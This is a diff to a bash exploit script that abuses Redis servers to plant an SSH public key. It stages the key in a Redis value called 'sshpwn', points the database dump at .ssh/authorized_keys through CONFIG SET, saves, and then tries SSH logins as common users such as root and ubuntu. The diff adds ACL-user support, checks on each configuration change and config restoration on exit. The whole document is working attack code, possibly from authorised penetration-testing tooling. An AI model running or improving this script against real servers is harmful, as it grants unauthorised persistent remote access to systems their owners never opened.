@@ -19,6 +19,7 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 TARGET=""
 PASS=""
+USERNAME=""
 PUBKEY_FILE=""
 PUBKEY_INLINE=""
 SSH_USERS="root redis ubuntu admin centos debian ec2-user"  # candidate users to try
@@ -32,6 +33,7 @@ while [ $# -gt 0 ]; do
     case "$1" in
         --target)     TARGET="$2"; shift 2 ;;
         --pass|-p)    PASS="$2";   shift 2 ;;
+        --user|--username) USERNAME="$2"; shift 2 ;;
         --key|-k)     PUBKEY_FILE="$2"; shift 2 ;;
         --key-inline) PUBKEY_INLINE="$2"; shift 2 ;;
         --users)      SSH_USERS="$2"; shift 2 ;;
@@ -54,6 +56,7 @@ Required:
 
 Options:
   --pass PASSWORD         redis AUTH password
+  --user USERNAME         Redis 6+ named ACL user
   --users 'a b c'         space-sep usernames to try via ssh (default: $SSH_USERS)
   --dirs 'd1 d2 ...'      override candidate .ssh dirs to write into
   --no-verify             don't attempt ssh login after dropping key
@@ -88,17 +91,26 @@ else
 fi
 
 # Cleanup trap — restore config on exit unless --keep was requested.
-SAVED_DIR=""; SAVED_DBFILE=""; SAVED_AOF=""
+SAVED_DIR=""; SAVED_DBFILE=""; SAVED_AOF=""; SAVED_MASTERAUTH=""; SAVED_MASTERUSER=""
+SAVED_ROLE=""; SAVED_MASTER_HOST=""; SAVED_MASTER_PORT=""
+CONFIG_SNAPSHOT_COMPLETE=0
 on_exit() {
-    if [ -n "$SAVED_DIR" ]; then
+    local rc=$? cleanup_failed=0
+    if [ "$CONFIG_SNAPSHOT_COMPLETE" = 1 ]; then
         if [ "$KEEPALIVE" = "1" ]; then
             err "--keep: leaving Redis config MODIFIED (dir/dbfilename/appendonly not reverted)."
             err "        Revert manually when done: CONFIG SET dir '$SAVED_DIR'; CONFIG SET dbfilename '$SAVED_DBFILE'; CONFIG SET appendonly '$SAVED_AOF'"
         else
             log "Restoring original Redis config"
-            restore_config
+            restore_config || cleanup_failed=1
         fi
     fi
+    trap - EXIT INT TERM
+    if [ "$cleanup_failed" = 1 ]; then
+        err "Redis restoration verification failed"
+        rc=77
+    fi
+    exit "$rc"
 }
 trap on_exit EXIT INT TERM
 
@@ -108,7 +120,8 @@ if [ "$AUTH_REQUIRED" = 1 ] && [ "$AUTHED" = 0 ]; then
 fi
 hit "Connected to $HOST:$PORT  (v${REDIS_VERSION:-?})"
 
-save_config
+save_config || { err "cannot read complete persistence/replication/auth state; refusing mutation"; exit 10; }
+CONFIG_SNAPSHOT_COMPLETE=1
 log "Saved config — dir='$SAVED_DIR' dbfilename='$SAVED_DBFILE' appendonly='$SAVED_AOF'"
 
 # Build key payload — pad with newlines so RDB header binary noise doesn't merge into the key line
@@ -127,18 +140,41 @@ for d in $SSH_DIRS; do
     # unnecessary: the pubkey is padded with newlines (KEY_BLOB) so it survives as a
     # valid authorized_keys line regardless of whatever RDB cruft precedes it. If you
     # ever genuinely need a minimal RDB, gate it behind an explicit, disclosed --flush.
-    rcmd SET sshpwn "$KEY_BLOB" >/dev/null
+    set_out=$(rcmd SET sshpwn "$KEY_BLOB" 2>&1); set_rc=$?
+    if [ "$set_rc" -ne 0 ] || ! redis_reply_is_ok "$set_out"; then
+        err "SET staging failed: ${set_out:-no response}"; exit 5
+    fi
+    strlen_out=$(rcmd STRLEN sshpwn 2>&1); strlen_rc=$?
+    if [ "$strlen_rc" -ne 0 ] || [ "$strlen_out" != "${#KEY_BLOB}" ]; then
+        err "SET staging verification failed: expected ${#KEY_BLOB} bytes, got ${strlen_out:-no response}"
+        exit 5
+    fi
     # redis-cli exits 0 even on `(error) ERR ...`, so branch on the reply text,
     # not $? — a non-writable/absent dir returns an error string, not a bad rc.
-    dir_out=$(rcmd CONFIG SET dir "$d" 2>&1)
-    if ! printf '%s' "$dir_out" | grep -qi '^OK'; then
+    dir_out=$(rcmd CONFIG SET dir "$d" 2>&1); dir_rc=$?
+    if [ "$dir_rc" -ne 0 ] || ! redis_reply_is_ok "$dir_out"; then
         miss "  CONFIG SET dir failed (path likely doesn't exist on target): ${dir_out:-no response}"
         continue
     fi
-    rcmd CONFIG SET dbfilename authorized_keys >/dev/null
-    rcmd CONFIG SET appendonly no >/dev/null
-    save_out=$(rcmd SAVE 2>&1)
-    if echo "$save_out" | grep -q 'OK'; then
+    applied=$(_config_get_value dir) || { err "CONFIG SET dir verification failed: unreadable state"; exit 5; }
+    [ "$applied" = "$d" ] || { err "CONFIG SET dir verification failed: expected '$d', got '$applied'"; exit 5; }
+
+    dbfile_out=$(rcmd CONFIG SET dbfilename authorized_keys 2>&1); dbfile_rc=$?
+    if [ "$dbfile_rc" -ne 0 ] || ! redis_reply_is_ok "$dbfile_out"; then
+        err "CONFIG SET dbfilename failed: ${dbfile_out:-no response}"; exit 5
+    fi
+    applied=$(_config_get_value dbfilename) || { err "CONFIG SET dbfilename verification failed: unreadable state"; exit 5; }
+    [ "$applied" = "authorized_keys" ] || { err "CONFIG SET dbfilename verification failed: expected 'authorized_keys', got '$applied'"; exit 5; }
+
+    aof_out=$(rcmd CONFIG SET appendonly no 2>&1); aof_rc=$?
+    if [ "$aof_rc" -ne 0 ] || ! redis_reply_is_ok "$aof_out"; then
+        err "CONFIG SET appendonly failed: ${aof_out:-no response}"; exit 5
+    fi
+    applied=$(_config_get_value appendonly) || { err "CONFIG SET appendonly verification failed: unreadable state"; exit 5; }
+    [ "$applied" = "no" ] || { err "CONFIG SET appendonly verification failed: expected 'no', got '$applied'"; exit 5; }
+
+    save_out=$(rcmd SAVE 2>&1); save_rc=$?
+    if [ "$save_rc" -eq 0 ] && redis_reply_is_ok "$save_out"; then
         hit "  SAVE OK to $d/authorized_keys"
         SUCCESS_DIR="$d"
         break
@@ -194,3 +230,4 @@ for u in $USERS_TO_TRY; do
     miss "  $u failed: $(echo "$out" | head -1)"
 done
 err "SSH attempted, no user accepted the key. The file was written; the user may not be one of: $USERS_TO_TRY"
+exit 5
